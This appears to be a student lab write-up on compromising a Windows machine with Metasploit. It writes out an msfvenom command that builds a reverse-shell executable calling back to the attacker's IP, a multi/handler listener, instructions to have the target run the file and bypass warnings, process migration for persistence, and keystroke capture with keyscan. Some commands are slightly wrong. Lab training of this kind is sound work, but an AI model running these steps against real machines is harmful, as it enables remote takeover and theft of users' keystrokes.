# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
<br/>
<img width="788" height="462" alt="image" src="https://github.com/user-attachments/assets/f126ad83-1617-42ee-b394-90db86a4dd88" />

## OUTPUT:
copy the fun.exe into the apache /var/www/html folder
<br/>
<img width="354" height="69" alt="image" src="https://github.com/user-attachments/assets/05280390-c9da-4b7e-9431-41b75431680a" />

## OUTPUT:
Start apache server
sudo systemctl apache2 start
<br/>
<img width="288" height="55" alt="image" src="https://github.com/user-attachments/assets/6e070d51-a0f8-4413-8c4d-e2e31c232f7c" />

## OUTPUT:
Check the status of apache2
<br/>
<img width="775" height="371" alt="image" src="https://github.com/user-attachments/assets/8df16c08-bf4e-4e54-8529-a9136e11ac11" />

## OUTPUT:
Invoke msfconsole:
<br/>
<img width="657" height="473" alt="image" src="https://github.com/user-attachments/assets/c94318c1-2662-489a-a361-57267d306ffe" />

## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
<br/>
<img width="763" height="519" alt="image" src="https://github.com/user-attachments/assets/bba817d4-8221-483c-85ab-2f075924c146" />

## OUTPUT:
Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
<br/>
<img width="601" height="143" alt="image" src="https://github.com/user-attachments/assets/7e7cedb3-96d1-4a8d-9cbf-2c6b8010a2f4" />


## OUTPUT:
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
<br/>
<img width="728" height="476" alt="image" src="https://github.com/user-attachments/assets/9c78c3f0-7a93-4ac5-8d51-f0424ea028cf" />
<br/>
Bypass any warning boxes, double-click the file, and allow it to run. On kali give the command exploit

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

## OUTPUT:
Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
<br/>
<img width="790" height="174" alt="image" src="https://github.com/user-attachments/assets/dc92f70e-6ea5-4c0b-958c-9ca471c0e10f" />

## OUTPUT:
<img width="783" height="398" alt="image" src="https://github.com/user-attachments/assets/1f059d73-5119-4609-b5d9-4145805b13f5" />





keyscan_dump	Shows the keystrokes captured so far


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

